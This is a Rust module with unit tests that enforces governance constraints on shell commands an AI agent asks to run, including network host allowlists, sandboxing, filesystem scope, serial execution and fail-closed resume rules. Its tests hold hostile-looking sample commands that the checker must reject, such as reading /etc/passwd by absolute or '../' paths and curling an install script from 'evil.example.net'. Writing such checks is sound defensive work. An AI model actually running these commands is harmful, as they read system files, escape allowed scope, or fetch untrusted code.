use zorai_protocol::ManagedCommandRequest;

use super::{ConstraintKind, GovernanceConstraint};
use std::path::{Component, Path, PathBuf};
use tree_sitter::{Node, Parser};

pub(crate) fn can_honor_constraints(
    constraints: &[GovernanceConstraint],
    request: &ManagedCommandRequest,
) -> bool {
    let mut constrained_request = request.clone();
    apply_constraints_to_request(&mut constrained_request, constraints);

    constraints.iter().all(|constraint| match constraint.kind {
        ConstraintKind::NetworkDenied => !constrained_request.allow_network,
        ConstraintKind::NetworkRestricted => {
            network_restriction_satisfied(constraint, &constrained_request)
        }
        ConstraintKind::SandboxRequired => constrained_request.sandbox_enabled,
        ConstraintKind::FilesystemScopeNarrowed => {
            filesystem_scope_satisfied(constraint, &constrained_request)
        }
        ConstraintKind::TargetScopeCapped => target_scope_capped_satisfied(constraint, request),
        ConstraintKind::SerialOnlyExecution => serial_only_satisfied(&constrained_request),
        ConstraintKind::RetriesDisabled => retries_disabled_satisfied(constraint),
        ConstraintKind::RetriesRequireFreshCheckpoint => fresh_checkpoint_satisfied(constraint),
        ConstraintKind::ArtifactRetentionElevated => artifact_retention_satisfied(constraint),
        ConstraintKind::ManualResumeRequiredAfterCompletion => manual_resume_satisfied(constraint),
    })
}

pub(crate) fn apply_constraints_to_request(
    request: &mut ManagedCommandRequest,
    constraints: &[GovernanceConstraint],
) {
    for constraint in constraints {
        match constraint.kind {
            ConstraintKind::NetworkDenied => request.allow_network = false,
            ConstraintKind::SandboxRequired => request.sandbox_enabled = true,
            ConstraintKind::NetworkRestricted
            | ConstraintKind::FilesystemScopeNarrowed
            | ConstraintKind::TargetScopeCapped
            | ConstraintKind::SerialOnlyExecution
            | ConstraintKind::RetriesDisabled
            | ConstraintKind::RetriesRequireFreshCheckpoint
            | ConstraintKind::ArtifactRetentionElevated
            | ConstraintKind::ManualResumeRequiredAfterCompletion => {}
        }
    }
}

fn network_restriction_satisfied(
    constraint: &GovernanceConstraint,
    request: &ManagedCommandRequest,
) -> bool {
    let Some(spec) = constraint.network_restriction_spec() else {
        return false;
    };
    let allowed_hosts = spec
        .allowed_hosts
        .iter()
        .map(|host| normalize_host(host))
        .collect::<Option<Vec<_>>>();
    let Some(allowed_hosts) = allowed_hosts else {
        return false;
    };
    if allowed_hosts.is_empty() {
        return false;
    }
    if !request.allow_network {
        return true;
    }

    let Some(tokens) = shlex::split(&request.command) else {
        return false;
    };
    let hosts = tokens
        .iter()
        .flat_map(|token| network_hosts_from_token(token))
        .collect::<Vec<_>>();
    if hosts.is_empty() {
        return false;
    }
    hosts.iter().all(|host| {
        allowed_hosts
            .iter()
            .any(|allowed| host_matches(host, allowed))
    })
}

fn normalize_host(host: &str) -> Option<String> {
    let trimmed = host.trim().trim_end_matches('.').to_ascii_lowercase();
    if trimmed.is_empty() || trimmed.contains('/') || trimmed.chars().any(char::is_whitespace) {
        return None;
    }
    Some(trimmed)
}

fn network_hosts_from_token(token: &str) -> Vec<String> {
    let mut hosts = Vec::new();
    let candidate = token
        .split_once('=')
        .map(|(_, value)| value)
        .unwrap_or(token)
        .trim_matches(|ch| matches!(ch, '"' | '\''));

    if let Ok(url) = url::Url::parse(candidate) {
        if let Some(host) = url.host_str().and_then(normalize_host) {
            hosts.push(host);
        }
    } else if let Some((user_host, _path)) = candidate.split_once(':') {
        let host = user_host
            .rsplit_once('@')
            .map(|(_, host)| host)
            .unwrap_or(user_host);
        if !host.is_empty() && !host.starts_with('/') && host.contains('.') {
            if let Some(host) = normalize_host(host) {
                hosts.push(host);
            }
        }
    }

    hosts
}

fn host_matches(host: &str, allowed: &str) -> bool {
    if allowed == "*" || host == allowed {
        return true;
    }
    allowed
        .strip_prefix("*.")
        .is_some_and(|suffix| host.ends_with(&format!(".{suffix}")))
}

fn target_scope_capped_satisfied(
    constraint: &GovernanceConstraint,
    request: &ManagedCommandRequest,
) -> bool {
    let Some(spec) = constraint.target_scope_cap_spec() else {
        return false;
    };
    if spec.max_targets == Some(0) {
        return false;
    }
    if spec.allowed_prefixes.is_empty() {
        return true;
    }
    filesystem_prefixes_satisfied(&spec.allowed_prefixes, request)
}

fn serial_only_satisfied(request: &ManagedCommandRequest) -> bool {
    shell_background_operator_present(&request.command) == Some(false)
}

fn retries_disabled_satisfied(constraint: &GovernanceConstraint) -> bool {
    constraint
        .retries_disabled_spec()
        .is_some_and(|spec| spec.enabled)
}

fn fresh_checkpoint_satisfied(constraint: &GovernanceConstraint) -> bool {
    constraint
        .retry_checkpoint_spec()
        .is_some_and(|spec| spec.max_age_secs != Some(0))
}

fn artifact_retention_satisfied(constraint: &GovernanceConstraint) -> bool {
    constraint.artifact_retention_spec().is_some_and(|spec| {
        matches!(
            spec.level.trim(),
            "snapshot" | "elevated" | "full" | "decision_trace"
        )
    })
}

fn manual_resume_satisfied(constraint: &GovernanceConstraint) -> bool {
    let _ = constraint.manual_resume_spec();
    // Managed command dispatch currently has no post-completion pause/resume
    // control, so this constraint must fail closed instead of being accepted.
    false
}

/// Checks the request against a `FilesystemScopeNarrowed` constraint:
///   1. `request.cwd` must be under at least one allowed prefix.
///   2. Every absolute-path token in the (shlex-tokenized) command must be
///      under at least one allowed prefix.
///
fn filesystem_scope_satisfied(
    constraint: &GovernanceConstraint,
    request: &ManagedCommandRequest,
) -> bool {
    let Some(prefixes) = constraint.filesystem_scope_prefixes() else {
        return false;
    };
    if prefixes.is_empty() {
        return false;
    }
    filesystem_prefixes_satisfied(&prefixes, request)
}

fn filesystem_prefixes_satisfied(prefixes: &[String], request: &ManagedCommandRequest) -> bool {
    let Some(cwd) = request.cwd.as_deref() else {
        return false;
    };
    if !is_path_within_any(cwd, &prefixes) {
        return false;
    }
    let Some(tokens) = shlex::split(&request.command) else {
        return false;
    };
    for token in tokens {
        let Some(path) = path_token_to_check(&token, cwd) else {
            continue;
        };
        if !is_path_within_any(&path, &prefixes) {
            return false;
        }
    }
    true
}

fn shell_background_operator_present(command: &str) -> Option<bool> {
    let mut parser = Parser::new();
    parser.set_language(&tree_sitter_bash::language()).ok()?;
    let tree = parser.parse(command, None)?;
    let root = tree.root_node();
    if root.has_error() {
        return None;
    }
    Some(node_contains_operator(root, "&"))
}

fn node_contains_operator(node: Node<'_>, operator: &str) -> bool {
    if node.kind() == operator {
        return true;
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if node_contains_operator(child, operator) {
            return true;
        }
    }
    false
}

fn is_path_within_any(path: &str, prefixes: &[String]) -> bool {
    let Some(normalized) = normalize_absolute_path(path) else {
        return false;
    };
    prefixes.iter().any(|prefix| {
        normalize_absolute_path(prefix)
            .as_deref()
            .is_some_and(|prefix| path_has_prefix(&normalized, prefix))
    })
}

fn path_token_to_check(token: &str, cwd: &str) -> Option<String> {
    if token.starts_with('/') {
        return Some(token.to_string());
    }
    let path_candidate =
        if token.starts_with("./") || token.starts_with("../") || token.contains('/') {
            Some(token)
        } else if let Some((_, value)) = token.split_once('=') {
            if value.starts_with('/')
                || value.starts_with("./")
                || value.starts_with("../")
                || value.contains('/')
            {
                Some(value)
            } else {
                None
            }
        } else {
            None
        }?;
    Some(
        Path::new(cwd)
            .join(path_candidate)
            .to_string_lossy()
            .into_owned(),
    )
}

fn normalize_absolute_path(path: &str) -> Option<String> {
    let input = Path::new(path);
    if !input.is_absolute() {
        return None;
    }

    let mut normalized = PathBuf::new();
    for component in input.components() {
        match component {
            Component::RootDir | Component::Prefix(_) => normalized.push(component.as_os_str()),
            Component::CurDir => {}
            Component::ParentDir => {
                normalized.pop();
            }
            Component::Normal(part) => normalized.push(part),
        }
    }

    let normalized = normalized.to_string_lossy();
    if normalized.is_empty() {
        Some("/".to_string())
    } else {
        Some(normalized.trim_end_matches('/').to_string())
    }
}

fn path_has_prefix(path: &str, prefix: &str) -> bool {
    if path == prefix {
        return true;
    }
    // Match `prefix` exactly OR `prefix/...` — not `prefix-suffix`, which would
    // wrongly let `/etc-evil` slip under a `/etc` allowance.
    path.starts_with(&format!("{prefix}/"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use zorai_protocol::{ManagedCommandSource, SecurityLevel};

    fn request(allow_network: bool, sandbox_enabled: bool) -> ManagedCommandRequest {
        ManagedCommandRequest {
            command: "echo hello".to_string(),
            rationale: "test".to_string(),
            allow_network,
            sandbox_enabled,
            security_level: SecurityLevel::Moderate,
            cwd: Some("/tmp".to_string()),
            language_hint: Some("bash".to_string()),
            source: ManagedCommandSource::Agent,
        }
    }

    #[test]
    fn sandbox_required_is_honored_after_constraint_application() {
        let constraints = vec![GovernanceConstraint::sandbox_required(
            "external side effects must run inside a sandbox",
        )];

        assert!(can_honor_constraints(&constraints, &request(true, false)));
    }

    #[test]
    fn network_denied_is_honored_after_constraint_application() {
        let constraints = vec![GovernanceConstraint::network_denied(
            "network access must be disabled",
        )];

        assert!(can_honor_constraints(&constraints, &request(true, false)));
    }

    fn scoped_request(cwd: &str, command: &str) -> ManagedCommandRequest {
        let mut req = request(false, true);
        req.cwd = Some(cwd.to_string());
        req.command = command.to_string();
        req
    }

    #[test]
    fn filesystem_scope_narrowed_accepts_cwd_within_allowed_prefix() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace/sub", "ls");
        assert!(can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_cwd_outside_allowed_prefix() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/etc", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_absolute_path_argument_outside_scope() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace", "cat /etc/passwd");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_accepts_relative_path_argument() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace", "cat ./README.md");
        assert!(can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_sibling_prefix_lookalike() {
        // A bare `starts_with` would let `/tmp/workspace-evil` slip under a
        // `/tmp/workspace` allowance. The boundary check must require a `/`
        // separator after the prefix.
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace-evil", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_with_empty_prefix_list_rejects() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            Vec::new(),
            "scope-bound",
        )];
        let req = scoped_request("/etc", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_unparseable_command() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        // Unbalanced quote — shlex returns None, so we can't argv-inspect.
        let req = scoped_request("/tmp/workspace", "echo \"unclosed");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_relative_parent_escape() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace/subdir", "cat ../../etc/passwd");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_absolute_parent_escape() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace", "cat /tmp/workspace/../secret");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_missing_cwd() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            vec!["/tmp/workspace".to_string()],
            "scope-bound",
        )];
        let mut req = request(false, true);
        req.cwd = None;
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_malformed_value() {
        let constraints = vec![GovernanceConstraint {
            kind: ConstraintKind::FilesystemScopeNarrowed,
            value: Some("not json".to_string()),
            rationale: Some("scope-bound".to_string()),
        }];
        let req = scoped_request("/tmp/workspace", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn filesystem_scope_narrowed_rejects_empty_prefix_list() {
        let constraints = vec![GovernanceConstraint::filesystem_scope_narrowed(
            Vec::new(),
            "scope-bound",
        )];
        let req = scoped_request("/tmp/workspace", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn network_restricted_allows_only_declared_hosts() {
        let constraints = vec![GovernanceConstraint::network_restricted(
            vec!["example.com".to_string()],
            "host-bound",
        )];
        let mut req = scoped_request("/tmp", "curl https://example.com/install.sh");
        req.allow_network = true;
        assert!(can_honor_constraints(&constraints, &req));

        req.command = "curl https://evil.example.net/install.sh".to_string();
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn network_restricted_rejects_network_enabled_command_without_static_host() {
        let constraints = vec![GovernanceConstraint::network_restricted(
            vec!["example.com".to_string()],
            "host-bound",
        )];
        let mut req = scoped_request("/tmp", "curl \"$URL\"");
        req.allow_network = true;
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn network_restricted_is_honored_when_network_is_disabled() {
        let constraints = vec![GovernanceConstraint::network_restricted(
            vec!["example.com".to_string()],
            "host-bound",
        )];
        let req = scoped_request("/tmp", "echo offline");
        assert!(can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn target_scope_capped_reuses_filesystem_scope_checks() {
        let constraints = vec![GovernanceConstraint::target_scope_capped(
            vec!["/tmp/workspace".to_string()],
            Some(1),
            "target-bound",
        )];
        let req = scoped_request("/tmp/workspace", "cat /etc/passwd");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn target_scope_capped_rejects_zero_target_cap() {
        let constraints = vec![GovernanceConstraint::target_scope_capped(
            Vec::new(),
            Some(0),
            "target-bound",
        )];
        let req = scoped_request("/tmp/workspace", "ls");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn serial_only_rejects_shell_background_operator() {
        let constraints = vec![GovernanceConstraint::serial_only("one at a time")];
        let req = scoped_request("/tmp", "sleep 1 & echo done");
        assert!(!can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn serial_only_ignores_background_operator_inside_quotes() {
        let constraints = vec![GovernanceConstraint::serial_only("one at a time")];
        let req = scoped_request("/tmp", r#"printf "a & b""#);
        assert!(can_honor_constraints(&constraints, &req));
    }

    #[test]
    fn retry_and_artifact_constraints_parse_specs_instead_of_succeeding_by_kind_only() {
        let req = scoped_request("/tmp", "echo ok");

        let malformed_retry = vec![GovernanceConstraint {
            kind: ConstraintKind::RetriesDisabled,
            value: Some("not json".to_string()),
            rationale: Some("malformed".to_string()),
        }];
        assert!(!can_honor_constraints(&malformed_retry, &req));

        let retry_disabled = vec![GovernanceConstraint::retries_disabled("no retries")];
        assert!(can_honor_constraints(&retry_disabled, &req));

        let stale_checkpoint = vec![GovernanceConstraint::retries_require_fresh_checkpoint(
            Some(0),
            "fresh checkpoint",
        )];
        assert!(!can_honor_constraints(&stale_checkpoint, &req));

        let elevated_artifacts = vec![GovernanceConstraint::artifact_retention_elevated(
            "snapshot",
            "retain execution snapshot",
        )];
        assert!(can_honor_constraints(&elevated_artifacts, &req));
    }

    #[test]
    fn manual_resume_required_fails_closed_until_runtime_support_exists() {
        let constraints = vec![
            GovernanceConstraint::manual_resume_required_after_completion("operator must resume"),
        ];
        let req = scoped_request("/tmp", "echo ok");
        assert!(!can_honor_constraints(&constraints, &req));
    }
}
